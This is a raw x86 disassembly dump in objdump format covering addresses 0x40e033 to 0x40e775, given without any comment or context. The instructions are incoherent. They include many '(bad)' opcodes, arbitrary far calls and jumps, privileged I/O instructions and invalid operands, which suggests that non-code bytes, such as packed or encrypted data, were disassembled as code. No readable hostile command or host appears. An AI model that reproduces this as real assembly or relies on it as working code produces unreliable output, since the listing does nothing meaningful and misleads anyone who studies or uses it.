  40e033:	stos   DWORD PTR es:[edi],eax
  40e034:	xor    BYTE PTR ds:0xf022078d,ah
  40e03a:	xchg   ebx,eax
  40e03c:	jno    0x40e03d
  40e03e:	loopne 0x40dfe9
  40e040:	daa    
  40e041:	or     ebp,DWORD PTR [esi]
  40e043:	jno    0x40e07f
  40e045:	sbb    edx,DWORD PTR [esi-0x61]
  40e048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e049:	cmc    
  40e04a:	call   0x7a54:0xf02e1978
  40e051:	jle    0x40e01d
  40e053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e054:	retf   0xb0ce
  40e057:	std    
  40e058:	repz loope 0x40e0c8
  40e05b:	xchg   ebp,eax
  40e05c:	lods   al,BYTE PTR ds:[esi]
  40e05d:	out    dx,al
  40e05e:	jne    0x40e004
  40e060:	mov    dl,0xd0
  40e062:	retf   
  40e063:	adc    eax,0xa7713dd0
  40e068:	jbe    0x40e021
  40e06a:	gs push ecx
  40e06c:	xchg   BYTE PTR [esi-0x21],ah
  40e06f:	dec    ebp
  40e070:	mov    esi,esp
  40e072:	aas    
  40e073:	daa    
  40e074:	jne    0x40e0f1
  40e076:	cdq    
  40e077:	fdivr  DWORD PTR [ecx+0x34]
  40e07a:	std    
  40e07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e07c:	mul    BYTE PTR [edx-0x37]
  40e07f:	bnd jmp 0x40e0f0
  40e082:	cmp    ch,BYTE PTR [ebx+ecx*8]
  40e085:	inc    esi
  40e086:	mov    ds:0x1d0b5fe8,eax
  40e08b:	test   eax,0x566ca12e
  40e090:	pushf  
  40e091:	or     ebx,DWORD PTR [edi+0x46f69765]
  40e097:	sub    ah,BYTE PTR [edx]
  40e099:	in     al,0x9a
  40e09b:	and    al,BYTE PTR [esi-0x42]
  40e09e:	jmp    0x385fe0ec
  40e0a3:	mov    edx,0x67eb3227
  40e0a8:	jge    0x40e106
  40e0aa:	test   BYTE PTR ds:0x139a162b,ah
  40e0b0:	mov    esi,0x8a7c6f2d
  40e0b5:	je     0x40e03a
  40e0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b8:	retf   
  40e0b9:	hlt    
  40e0ba:	fnstsw WORD PTR [esp+edi*4+0x4298dfe4]
  40e0c1:	out    dx,al
  40e0c2:	mov    dh,0xa0
  40e0c4:	popf   
  40e0c5:	add    eax,ecx
  40e0c7:	sub    eax,0xc9d1ebc7
  40e0cc:	repz adc eax,0x23258d95
  40e0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0d3:	inc    edi
  40e0d4:	dec    esp
  40e0d5:	dec    esi
  40e0d6:	add    al,0x9
  40e0d8:	test   al,0xe
  40e0da:	shl    DWORD PTR [edx],0x31
  40e0dd:	xchg   BYTE PTR [edx+0x27],dh
  40e0e0:	stos   DWORD PTR es:[edi],eax
  40e0e1:	fisttp DWORD PTR ds:[edi+0x2c9ada5c]
  40e0e8:	loopne 0x40e06f
  40e0ea:	dec    ecx
  40e0eb:	daa    
  40e0ec:	mov    ah,BYTE PTR ds:0xba8c9d81
  40e0f2:	sbb    dh,BYTE PTR [edi-0x27]
  40e0f5:	mov    bh,0x95
  40e0f7:	sub    eax,0x229d145d
  40e0fc:	fild   WORD PTR [eax+0x1ba25525]
  40e102:	xchg   BYTE PTR [ebx+0x75040bf1],ah
  40e108:	mov    ah,BYTE PTR [edi-0x2243c73b]
  40e10e:	fwait
  40e10f:	jecxz  0x40e144
  40e111:	sbb    DWORD PTR [ebp+0x2],edi
  40e114:	cdq    
  40e115:	rcl    BYTE PTR [edx+0x23],cl
  40e118:	stos   DWORD PTR es:[edi],eax
  40e119:	or     ecx,DWORD PTR [eax-0x21]
  40e11c:	jns    0x40e0df
  40e11e:	xchg   ecx,eax
  40e11f:	push   esi
  40e120:	pop    ds
  40e121:	and    al,0xec
  40e123:	inc    BYTE PTR [esi+eax*4-0x66]
  40e127:	push   0x11f421a3
  40e12c:	pop    esp
  40e12d:	inc    eax
  40e12e:	lods   al,BYTE PTR ds:[esi]
  40e12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e130:	push   es
  40e131:	retf   
  40e132:	xor    DWORD PTR [ebx+0xf48a242],esp
  40e138:	mov    dl,0x49
  40e13a:	add    al,al
  40e13c:	jecxz  0x40e11b
  40e13e:	cld    
  40e13f:	out    dx,eax
  40e140:	(bad)  
  40e141:	or     ecx,DWORD PTR [ecx+0x25]
  40e144:	cmp    esi,eax
  40e146:	arpl   WORD PTR [eax],ax
  40e148:	ins    DWORD PTR es:[edi],dx
  40e149:	or     al,0x99
  40e14b:	sbb    esp,0xffffff9b
  40e14e:	add    eax,DWORD PTR [edx+0xa]
  40e151:	xchg   ebx,eax
  40e152:	mov    ebp,0xd71c7ba
  40e157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e158:	sahf   
  40e159:	dec    edx
  40e15a:	mov    ah,0xf5
  40e15c:	mov    edx,0xbc3b1479
  40e161:	loope  0x40e122
  40e163:	xchg   esi,eax
  40e164:	fcmove st,st(3)
  40e166:	cld    
  40e167:	adc    eax,0x9dfd40b3
  40e16c:	das    
  40e16d:	inc    ebp
  40e16e:	sbb    al,BYTE PTR [ecx]
  40e170:	je     0x40e14a
  40e172:	sub    DWORD PTR [ebx+0x549a2834],esi
  40e178:	ja     0x40e1d2
  40e17a:	out    dx,eax
  40e17b:	and    eax,0xb9ac3e3d
  40e180:	inc    esi
  40e181:	xor    cl,BYTE PTR [edx+0x20]
  40e184:	out    0xe8,al
  40e186:	push   eax
  40e187:	inc    esp
  40e188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e189:	sbb    ah,BYTE PTR [edx-0x46]
  40e18c:	mov    bl,0xf8
  40e18e:	mov    esp,0x95c4c1e3
  40e193:	or     DWORD PTR [edi],edx
  40e195:	or     eax,DWORD PTR [eax-0x5909d99f]
  40e19b:	mov    DWORD PTR [esi+eax*8+0x25],edi
  40e19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1a0:	and    edi,ecx
  40e1a2:	pop    ecx
  40e1a3:	mov    ecx,0x4f94e5fe
  40e1a8:	inc    ebx
  40e1a9:	jl     0x40e16d
  40e1ab:	leave  
  40e1ac:	and    dl,BYTE PTR ds:0x8169e9d9
  40e1b2:	shl    BYTE PTR [edi-0x3],0xc6
  40e1b6:	out    0xa7,al
  40e1b8:	mov    esp,DWORD PTR [edi]
  40e1ba:	or     DWORD PTR [eax],edi
  40e1bc:	xchg   ecx,eax
  40e1bd:	iret   
  40e1be:	bound  edi,QWORD PTR [edx+esi*4]
  40e1c1:	fisub  WORD PTR [ebp-0x303b6019]
  40e1c7:	mov    dh,0xb7
  40e1c9:	or     esp,DWORD PTR ds:0x1469d15c
  40e1cf:	test   eax,0xbfb2e4a2
  40e1d4:	scas   al,BYTE PTR es:[edi]
  40e1d5:	jmp    0x1119:0x5a9a3184
  40e1dc:	(bad)  
  40e1dd:	outs   dx,BYTE PTR ds:[esi]
  40e1de:	push   edi
  40e1df:	aas    
  40e1e0:	mov    bh,0x10
  40e1e2:	cmp    esi,DWORD PTR [ebp-0x5bfa98d1]
  40e1e8:	or     dl,BYTE PTR [edi+ebp*2+0x18]
  40e1ec:	push   0xffffffa8
  40e1ee:	jmp    0x40e240
  40e1f0:	mov    dl,0x1f
  40e1f2:	xchg   edx,eax
  40e1f3:	lds    esi,FWORD PTR [esp+esi*2+0xb99aed2]
  40e1fa:	adc    ebx,DWORD PTR fs:[esi+0x49]
  40e1fe:	mov    ch,0x73
  40e200:	xchg   BYTE PTR [esi+0x56bca599],al
  40e206:	push   esp
  40e207:	aaa    
  40e208:	xchg   ebp,eax
  40e209:	fwait
  40e20a:	push   eax
  40e20b:	sti    
  40e20c:	dec    edx
  40e20d:	daa    
  40e20e:	push   edx
  40e20f:	pop    esi
  40e210:	or     edi,DWORD PTR cs:[esi+0x539ccc2d]
  40e217:	data16 int 0x5
  40e21a:	(bad)  
  40e21b:	inc    eax
  40e21c:	jo     0x40e22a
  40e21e:	das    
  40e21f:	pop    ds
  40e220:	test   esp,esp
  40e222:	cli    
  40e223:	(bad)  
  40e224:	ins    BYTE PTR es:[edi],dx
  40e225:	sub    ebp,DWORD PTR [ecx-0x59]
  40e228:	pop    ss
  40e229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e22a:	les    ebp,FWORD PTR [esi-0x1d1673e5]
  40e230:	retf   
  40e231:	pop    ecx
  40e232:	cdq    
  40e233:	add    eax,0xc8952350
  40e238:	jmp    0xf5a5fc20
  40e23d:	xor    BYTE PTR [eax+eax*4],dl
  40e240:	mov    dl,0x60
  40e242:	dec    edi
  40e243:	cmc    
  40e244:	sbb    WORD PTR [edx+0x2b],cx
  40e248:	mov    bl,0xc2
  40e24a:	cmp    dl,BYTE PTR [edx+eiz*1-0x6d8e0a88]
  40e251:	icebp  
  40e252:	xor    edx,DWORD PTR [ecx-0x7a]
  40e255:	or     ebx,esi
  40e257:	in     eax,dx
  40e258:	sbb    BYTE PTR [ecx+0x316fa5cc],dl
  40e25e:	call   0x27aa:0xd5ab536
  40e265:	push   esp
  40e266:	mov    eax,0x8f0b96d1
  40e26b:	and    ebx,DWORD PTR [ebp-0x44131213]
  40e271:	jge    0x40e20d
  40e273:	les    esp,FWORD PTR [esi-0x39]
  40e276:	xchg   esp,eax
  40e277:	js     0x40e248
  40e279:	out    dx,al
  40e27a:	jmp    0xe955:0x1144e7a7
  40e281:	push   edi
  40e282:	mov    dh,0xcd
  40e284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e285:	retf   
  40e286:	inc    ebx
  40e287:	inc    edi
  40e288:	mov    dl,0x9c
  40e28a:	int    0x5b
  40e28c:	mov    bl,0xe7
  40e28e:	dec    eax
  40e28f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e290:	or     DWORD PTR [ecx],ecx
  40e292:	jg     0x40e2a1
  40e294:	cmp    esi,ebx
  40e296:	mov    ah,0xe0
  40e298:	mov    dl,0x77
  40e29a:	(bad)  
  40e29b:	jge    0x40e2ab
  40e29d:	xor    eax,0xb2ce6be
  40e2a2:	out    dx,al
  40e2a3:	push   ss
  40e2a4:	mov    eax,ds:0xd595d105
  40e2a9:	sbb    al,0x9a
  40e2ab:	shr    BYTE PTR [esi+0x2309b910],1
  40e2b1:	pop    eax
  40e2b2:	push   0xffffffa6
  40e2b4:	(bad)  
  40e2b5:	clc    
  40e2b6:	adc    esp,DWORD PTR [edi]
  40e2b8:	sbb    cl,dh
  40e2ba:	(bad)  
  40e2bb:	push   esp
  40e2bc:	adc    dh,BYTE PTR [edi+0x13b2a6be]
  40e2c2:	aam    0x47
  40e2c4:	std    
  40e2c5:	neg    ebx
  40e2c7:	shr    bl,0xe3
  40e2ca:	pop    ebp
  40e2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2cc:	xchg   edx,eax
  40e2cd:	je     0x40e2f7
  40e2cf:	sub    al,0xf8
  40e2d1:	repz and DWORD PTR [esi-0x43],edi
  40e2d5:	add    BYTE PTR [ebx],dl
  40e2d7:	push   ss
  40e2d8:	test   BYTE PTR fs:[ebp+0x5dbd6287],ah
  40e2df:	or     edx,DWORD PTR [ebx]
  40e2e1:	aaa    
  40e2e2:	mov    dl,0xe4
  40e2e4:	mov    dl,0xb3
  40e2e6:	test   eax,0x2b456c22
  40e2eb:	push   0xffffffb2
  40e2ed:	xchg   edi,eax
  40e2ee:	push   0xc4b3657
  40e2f3:	sub    eax,0xd4587598
  40e2f8:	push   ss
  40e2f9:	or     BYTE PTR [ebx],al
  40e2fb:	jecxz  0x40e2ec
  40e2fd:	jo     0x40e2d2
  40e2ff:	sbb    al,0x12
  40e301:	cmp    esp,DWORD PTR [esi-0x5e]
  40e304:	mov    dl,0x2f
  40e306:	cmp    ebp,DWORD PTR [ebp+0x2c35d0c5]
  40e30c:	(bad)  
  40e30d:	jmp    0x40e31d
  40e30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e310:	cmp    bl,BYTE PTR [ecx]
  40e312:	adc    ebx,DWORD PTR [edx]
  40e314:	repnz cmp edi,DWORD PTR [ecx+esi*4+0x54]
  40e319:	scas   eax,DWORD PTR es:[edi]
  40e31a:	fs push 0xffffffb2
  40e31d:	int3   
  40e31e:	xchg   edi,eax
  40e31f:	inc    eax
  40e320:	add    ch,BYTE PTR [ebp-0x6a]
  40e323:	iret   
  40e324:	pop    ebp
  40e325:	or     BYTE PTR [ecx],al
  40e327:	jo     0x40e2d3
  40e329:	xlat   BYTE PTR ds:[ebx]
  40e32a:	(bad)  
  40e32b:	fidivr DWORD PTR [edx]
  40e32d:	ret    0xf895
  40e330:	mov    dl,0x5c
  40e332:	out    dx,eax
  40e333:	mov    DWORD PTR [ebp+0x69ce3019],eax
  40e339:	add    eax,0x2c2d916c
  40e33e:	fcmovbe st,st(3)
  40e340:	inc    ecx
  40e341:	cdq    
  40e342:	rcl    DWORD PTR [edi-0x4e],cl
  40e345:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40e347:	jmp    0x59d8838c
  40e34c:	or     cl,BYTE PTR [ecx*4-0x5c18b666]
  40e353:	jns    0x40e307
  40e355:	cli    
  40e356:	nop
  40e357:	aas    
  40e358:	lea    edx,[ebx-0x67]
  40e35b:	sub    eax,0x1c7eba13
  40e360:	jne    0x40e315
  40e362:	xor    dl,BYTE PTR [ecx-0x583212c3]
  40e368:	std    
  40e369:	les    eax,FWORD PTR [eax]
  40e36b:	push   edx
  40e36c:	(bad)  
  40e36d:	push   esi
  40e36e:	jg     0x40e3ed
  40e370:	mov    cl,0x50
  40e372:	shl    BYTE PTR [ecx+0x6f7cb2f6],1
  40e378:	(bad)  
  40e379:	cs cmp eax,0xb992bea7
  40e37f:	(bad)  [eax]
  40e381:	fisttp DWORD PTR [edx-0x29ce4aee]
  40e387:	sub    edx,DWORD PTR [edi]
  40e389:	lahf   
  40e38a:	imul   eax,DWORD PTR ds:0xb24abbea,0x0
  40e391:	or     edi,DWORD PTR ds:0x2b29ba49
  40e397:	jp     0x40e3e4
  40e399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e39a:	call   0x2559:0x2e9d0743
  40e3a1:	in     al,dx
  40e3a2:	jp     0x40e34b
  40e3a4:	test   eax,0x10fede44
  40e3a9:	push   esp
  40e3aa:	mov    ch,0xcc
  40e3ac:	mov    dl,0x8b
  40e3ae:	mov    ?,WORD PTR [eax]
  40e3b0:	test   BYTE PTR [esi+0xb5229fe],bl
  40e3b6:	mov    ebx,0xe721f1be
  40e3bb:	push   eax
  40e3bc:	mov    BYTE PTR ds:0x831a4e9a,cl
  40e3c2:	mov    ?,WORD PTR [ecx]
  40e3c4:	mov    ds:0xeaa7b882,eax
  40e3c9:	xor    BYTE PTR [ecx],al
  40e3cb:	xor    edi,eax
  40e3cd:	loope  0x40e44a
  40e3cf:	push   0xd14d1d2
  40e3d4:	lods   eax,DWORD PTR ds:[esi]
  40e3d5:	call   0xf29d:0xb528eba5
  40e3dc:	add    eax,0x88871cb9
  40e3e1:	lods   eax,DWORD PTR ds:[esi]
  40e3e2:	inc    esp
  40e3e3:	pop    ds
  40e3e4:	mov    bl,0xc
  40e3e6:	fdiv   QWORD PTR [esi+eax*1]
  40e3e9:	bound  ebx,QWORD PTR [esi-0x72]
  40e3ec:	xchg   edx,eax
  40e3ed:	mov    esi,0x4842832f
  40e3f2:	retf   
  40e3f3:	mov    ecx,0x1d98cb28
  40e3f8:	div    DWORD PTR [eax]
  40e3fa:	push   esp
  40e3fb:	dec    edi
  40e3fc:	mov    dl,0xd6
  40e3fe:	sbb    eax,0x6bd76222
  40e403:	cli    
  40e404:	xor    BYTE PTR [ebx],cl
  40e406:	push   edi
  40e407:	pop    esp
  40e408:	je     0x40e441
  40e40a:	sti    
  40e40b:	loope  0x40e3a5
  40e40d:	es fwait
  40e40f:	lods   eax,DWORD PTR ds:[esi]
  40e410:	inc    ecx
  40e411:	and    dl,BYTE PTR [esi]
  40e413:	jmp    0x6cb2e880
  40e418:	or     eax,0xb2849730
  40e41d:	pop    ecx
  40e41e:	mov    ah,0x2c
  40e420:	mov    ebx,0xb5ec9c73
  40e425:	adc    eax,DWORD PTR [ebx]
  40e427:	fld    st(2)
  40e429:	adc    DWORD PTR [edx],edi
  40e42b:	xor    esi,edx
  40e42d:	mov    bh,0x10
  40e42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e430:	pop    edi
  40e431:	icebp  
  40e432:	sbb    al,0x6d
  40e434:	cmp    al,0x2f
  40e436:	sub    DWORD PTR [edi-0x4e],edi
  40e439:	test   eax,0xf31316eb
  40e43e:	jns    0x40e3e3
  40e440:	ds jne 0x40e3cd
  40e443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e444:	add    cl,BYTE PTR [edx+ebp*4-0x1d]
  40e448:	pop    ds
  40e449:	inc    edi
  40e44a:	sbb    eax,0xaf9b282
  40e44f:	nop
  40e450:	xor    ebp,DWORD PTR [eax+0x77541f04]
  40e456:	cmp    eax,0xc10e9ea9
  40e45b:	bnd jb 0x40e490
  40e45e:	xchg   esi,eax
  40e45f:	pop    ss
  40e460:	jecxz  0x40e41a
  40e462:	call   0xa047:0xff4cf9ad
  40e469:	mov    ch,0xee
  40e46b:	fcmovu st,st(0)
  40e46d:	or     eax,DWORD PTR [esi-0x68]
  40e470:	or     edx,DWORD PTR [ecx-0x7778b779]
  40e476:	call   0xad64:0xaea6738c
  40e47d:	mov    edi,0xe6e5a620
  40e482:	out    0xb2,al
  40e484:	jmp    0xaa840024
  40e489:	retf   0x3a9a
  40e48c:	mov    eax,0x635ec7e4
  40e491:	cld    
  40e492:	inc    ebp
  40e493:	ror    BYTE PTR [esi],cl
  40e495:	mov    ebx,0xf5a3a759
  40e49a:	or     edx,ebp
  40e49c:	jle    0x40e437
  40e49e:	lock adc eax,0x364f78bc
  40e4a4:	dec    eax
  40e4a5:	or     ebp,DWORD PTR [ecx]
  40e4a7:	fisubr WORD PTR [eax+0x43a4613e]
  40e4ad:	pusha  
  40e4ae:	ror    DWORD PTR [eax+0x1902016f],cl
  40e4b4:	pushf  
  40e4b5:	xor    DWORD PTR [eax+0x725b58d4],edx
  40e4bb:	push   0x11528eb2
  40e4c0:	cmp    al,0xdf
  40e4c2:	in     eax,0x99
  40e4c4:	jecxz  0x40e52f
  40e4c6:	sbb    DWORD PTR [ecx+0x30],esp
  40e4c9:	mov    ds:0xea29ce8c,al
  40e4ce:	cmp    cl,BYTE PTR [eax+0x33]
  40e4d1:	cld    
  40e4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4d3:	stos   DWORD PTR es:[edi],eax
  40e4d4:	dec    ebp
  40e4d5:	or     esi,ecx
  40e4d7:	retf   
  40e4d8:	js     0x40e507
  40e4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4db:	pop    edx
  40e4dc:	add    BYTE PTR [esp+ecx*1],al
  40e4df:	test   bh,dl
  40e4e1:	inc    esi
  40e4e2:	fisubr DWORD PTR [esi+0x51bf7c35]
  40e4e8:	mov    dl,0xc0
  40e4ea:	cmp    edi,DWORD PTR [ebx]
  40e4ec:	stos   BYTE PTR es:[edi],al
  40e4ed:	loope  0x40e4fd
  40e4ef:	and    ecx,edi
  40e4f1:	or     edx,edx
  40e4f3:	mov    ah,0xc
  40e4f5:	mov    ebx,0x5a866e52
  40e4fa:	out    dx,eax
  40e4fb:	(bad)  
  40e4fc:	mov    dl,0x71
  40e4fe:	test   DWORD PTR [esi],eax
  40e500:	mov    ds:0xab3b78c8,al
  40e505:	or     esi,DWORD PTR [edi+ebp*1-0x403dc90f]
  40e50c:	loope  0x40e51e
  40e50e:	mov    al,ds:0x40bfe3d
  40e513:	jno    0x40e4e5
  40e515:	cmp    al,0x8b
  40e517:	cmp    al,0x8a
  40e519:	or     esp,DWORD PTR [ecx+0x214ea5cf]
  40e51f:	adc    al,0xab
  40e521:	jbe    0x40e4c0
  40e523:	mov    edi,0xd0a6386a
  40e528:	inc    edx
  40e529:	jle    0x40e528
  40e52b:	in     eax,dx
  40e52c:	sbb    cl,BYTE PTR [ebx]
  40e52e:	paddd  mm7,QWORD PTR [eax]
  40e531:	inc    edi
  40e532:	or     al,0x24
  40e534:	nop
  40e535:	scas   al,BYTE PTR es:[edi]
  40e536:	call   0xce0:0xae68e7be
  40e53d:	xchg   ebx,eax
  40e53e:	pop    ebp
  40e53f:	pop    ebx
  40e540:	jge    0x40e54d
  40e542:	dec    esp
  40e543:	shl    BYTE PTR [edi],cl
  40e545:	enter  0xae1e,0xed
  40e549:	repz popf 
  40e54b:	add    eax,DWORD PTR [eax+esi*8-0x7f5234d2]
  40e552:	test   BYTE PTR [edi],ah
  40e554:	jge    0x40e5c1
  40e556:	sbb    eax,0x9cf1cde8
  40e55b:	clc    
  40e55c:	xor    ah,bl
  40e55e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e560:	jle    0xf9fe88a9
  40e566:	hlt    
  40e567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e568:	in     al,dx
  40e569:	sbb    eax,0xaf7cfb00
  40e56e:	sub    DWORD PTR [ebp+0x3141d87d],edi
  40e574:	jb     0x40e53a
  40e576:	aas    
  40e577:	pop    ebp
  40e578:	mov    dl,0x43
  40e57a:	sti    
  40e57b:	daa    
  40e57c:	inc    edi
  40e57d:	fldenv [ecx+0x660b23f0]
  40e583:	mov    eax,edx
  40e585:	and    edi,DWORD PTR [ebx]
  40e587:	sub    al,0x19
  40e589:	je     0x40e51f
  40e58b:	and    eax,0x62f0b5f0
  40e590:	inc    ebx
  40e591:	int3   
  40e592:	pop    edx
  40e593:	stos   DWORD PTR es:[edi],eax
  40e594:	mov    edx,0x83a7560d
  40e599:	mov    edi,0xa581b1a4
  40e59e:	inc    ebx
  40e59f:	das    
  40e5a0:	mov    cl,0x47
  40e5a2:	mov    fs,edi
  40e5a4:	out    0x26,eax
  40e5a6:	dec    edx
  40e5a7:	push   edi
  40e5a8:	js     0x40e548
  40e5aa:	push   cs
  40e5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ac:	cmc    
  40e5ad:	icebp  
  40e5ae:	outs   dx,BYTE PTR ds:[esi]
  40e5af:	push   cs
  40e5b0:	jne    0x40e5f0
  40e5b2:	les    ebx,FWORD PTR [eax-0x6f916b32]
  40e5b8:	iret   
  40e5b9:	lods   al,BYTE PTR ds:[esi]
  40e5ba:	call   0x74e7:0xd3047c45
  40e5c1:	fisub  DWORD PTR [ebx+ecx*4-0x21]
  40e5c5:	jae    0x40e580
  40e5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c8:	push   edx
  40e5c9:	xchg   edi,eax
  40e5ca:	mov    eax,0x875b6d5e
  40e5cf:	mov    cl,0x8f
  40e5d1:	rcr    dh,0xc6
  40e5d4:	sahf   
  40e5d5:	leave  
  40e5d6:	pop    edx
  40e5d7:	and    al,0x73
  40e5d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5da:	(bad)  
  40e5db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5dc:	dec    ecx
  40e5dd:	mov    edx,0x1356d2fe
  40e5e2:	sbb    BYTE PTR [ecx],ah
  40e5e4:	mov    al,0x56
  40e5e6:	jecxz  0x40e578
  40e5e8:	sbb    dl,BYTE PTR [edi+edi*4]
  40e5eb:	out    0xd5,eax
  40e5ed:	cmp    al,BYTE PTR [eax+ecx*4+0x61]
  40e5f1:	mov    DWORD PTR [esp+eax*2-0x4e],0x41daf607
  40e5f9:	jle    0x40e658
  40e5fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5fc:	loopne 0x40e5af
  40e5fe:	mov    ah,0xb0
  40e600:	int    0x7a
  40e602:	xor    dh,BYTE PTR [edi-0x1565d479]
  40e608:	sbb    bh,BYTE PTR [ecx]
  40e60a:	ucomiss xmm7,xmm2
  40e60d:	ja     0x40e5f7
  40e60f:	(bad)  
  40e610:	or     edx,DWORD PTR ds:[eax-0x2b6e9038]
  40e617:	mov    ah,dh
  40e619:	add    BYTE PTR [edx-0x363407a9],bl
  40e61f:	inc    ebp
  40e620:	or     esi,eax
  40e622:	push   cs
  40e623:	inc    ecx
  40e624:	jnp    0x40e659
  40e626:	sbb    DWORD PTR [edi+0x5cffd5a6],ecx
  40e62c:	les    ebx,FWORD PTR ds:0xba7bb49
  40e632:	call   0xc5e1:0x5d915f33
  40e639:	xor    DWORD PTR [edx+0x8afdbc9],ebx
  40e63f:	cmc    
  40e640:	xor    eax,0x1a748bd
  40e645:	sahf   
  40e646:	inc    eax
  40e647:	repz pop ss
  40e649:	push   edx
  40e64a:	rcl    DWORD PTR [eax-0x212fc84e],1
  40e650:	xor    DWORD PTR fs:[edi+0x1a],0xffffffee
  40e655:	or     edx,edi
  40e657:	push   cs
  40e658:	jb     0x40e5f8
  40e65a:	jmp    0x40e624
  40e65c:	pop    edx
  40e65d:	ret    0x789a
  40e660:	(bad)  
  40e661:	aas    
  40e662:	dec    esi
  40e663:	int3   
  40e664:	fs jno 0x40e648
  40e667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e668:	arpl   ax,bx
  40e66a:	mov    ds:0x4ada6e5,eax
  40e66f:	sbb    dh,BYTE PTR [edx+0x17ac1c9d]
  40e675:	sub    al,0xda
  40e677:	std    
  40e678:	aas    
  40e679:	or     esi,edx
  40e67b:	mov    dh,0x6b
  40e67d:	sbb    esp,DWORD PTR [esi+ecx*8-0x49]
  40e681:	fisubr DWORD PTR [edx+0x6c]
  40e684:	mov    ebp,0xd5ccaff1
  40e689:	mov    bh,0x32
  40e68b:	or     al,0xb2
  40e68d:	scas   eax,DWORD PTR es:[edi]
  40e68e:	inc    ecx
  40e68f:	push   ebx
  40e690:	sub    ecx,DWORD PTR [ebp+0x7ba723fc]
  40e696:	je     0x40e63f
  40e698:	jl     0x40e61a
  40e69a:	cdq    
  40e69b:	mov    ecx,0x1ce1a31f
  40e6a0:	mov    dl,0xd9
  40e6a2:	imul   eax,DWORD PTR [eax+0x78590e51],0x29
  40e6a9:	or     eax,esi
  40e6ab:	cmp    DWORD PTR [edi-0x74bf7257],ecx
  40e6b1:	scas   al,BYTE PTR es:[edi]
  40e6b2:	call   0xda5a:0x4159f92d
  40e6b9:	xlat   BYTE PTR ds:[ebx]
  40e6ba:	jecxz  0x40e663
  40e6bc:	cmp    bl,BYTE PTR [edx-0x2aab7698]
  40e6c2:	jne    0x40e72c
  40e6c4:	mov    dl,0xa9
  40e6c6:	sbb    cl,BYTE PTR [edx+0x26]
  40e6c9:	into   
  40e6ca:	lods   eax,DWORD PTR ds:[esi]
  40e6cb:	(bad)  
  40e6cc:	adc    ecx,DWORD PTR [eax]
  40e6ce:	mov    esp,0x74cb1b6
  40e6d3:	mov    esp,0x22082242
  40e6d8:	mov    dl,0x44
  40e6da:	sub    BYTE PTR [ecx-0x5e],ah
  40e6dd:	js     0x40e691
  40e6df:	test   DWORD PTR ds:0x8841cf0b,esp
  40e6e5:	ja     0x40e6b3
  40e6e7:	cmc    
  40e6e8:	push   es
  40e6e9:	rol    DWORD PTR [esi+0x5d492d5b],0x19
  40e6f0:	lfs    ebp,FWORD PTR [edx]
  40e6f3:	jmp    FWORD PTR [ecx]
  40e6f5:	xchg   DWORD PTR [eax+0xa0b8e5d],ecx
  40e6fb:	ret    0x4e32
  40e6fe:	mov    esp,0x9a6d6063
  40e703:	(bad)  
  40e704:	retf   
  40e705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e706:	mov    bl,0x42
  40e708:	push   ds
  40e709:	pop    eax
  40e70a:	or     ch,dl
  40e70c:	or     al,0xed
  40e70e:	pop    gs
  40e710:	pop    edi
  40e711:	addr16 sti 
  40e713:	jno    0x40e727
  40e715:	sub    cl,ah
  40e717:	xor    DWORD PTR [ebx+0x5f],esp
  40e71a:	call   0x49d3:0xbb87e35a
  40e721:	xor    eax,0xefaca752
  40e726:	jno    0x40e79a
  40e728:	outs   dx,DWORD PTR ds:[esi]
  40e729:	mov    dh,0x69
  40e72b:	jecxz  0x40e6df
  40e72d:	add    cl,BYTE PTR [edx]
  40e72f:	xchg   esi,eax
  40e730:	xchg   edx,eax
  40e731:	mov    al,0x97
  40e733:	fs ins BYTE PTR es:[edi],dx
  40e735:	or     ebp,DWORD PTR [edx]
  40e737:	cli    
  40e738:	sti    
  40e739:	inc    ebx
  40e73a:	iret   
  40e73b:	and    al,0x2a
  40e73d:	lods   al,BYTE PTR ds:[esi]
  40e73e:	call   0xb86f:0x25688527
  40e745:	sbb    eax,DWORD PTR [ebp+0x7e0f90d7]
  40e74b:	sbb    BYTE PTR [ecx],0x15
  40e74e:	(bad)  
  40e74f:	daa    
  40e750:	push   ecx
  40e751:	(bad)  
  40e752:	call   0x8f537477
  40e757:	push   0x588cd3b3
  40e75c:	dec    edx
  40e75d:	mov    ah,BYTE PTR [edx+0x4f]
  40e760:	jmp    0xcbdb:0x3cf4660b
  40e767:	popf   
  40e768:	call   0x3d7f:0xdcfc9345
  40e76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e770:	sub    eax,0x34fa1947
  40e775:	jns    0x40e6f7
